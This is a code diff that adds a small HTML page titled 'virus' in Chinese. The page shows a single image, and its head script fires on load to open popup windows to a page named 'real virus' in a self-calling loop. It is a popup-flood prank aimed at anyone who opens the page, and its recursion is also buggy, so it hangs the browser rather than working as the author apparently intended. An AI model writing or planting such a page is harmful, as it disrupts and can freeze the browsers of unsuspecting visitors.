@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+
+	<head>
+		<meta charset="UTF-8">
+		<title>病毒</title>
+		<script>
+			function abc(){
+				window.open("真病毒.html","","width=200px,height=200px");
+			    setTimeout(abc(),1000);
+			}
+			window.open=abc();
+		</script>                                                             
+	</head>
+
+	<body>
+		<img src="webPic.jpg"/>
+	</body>
+
+</html>
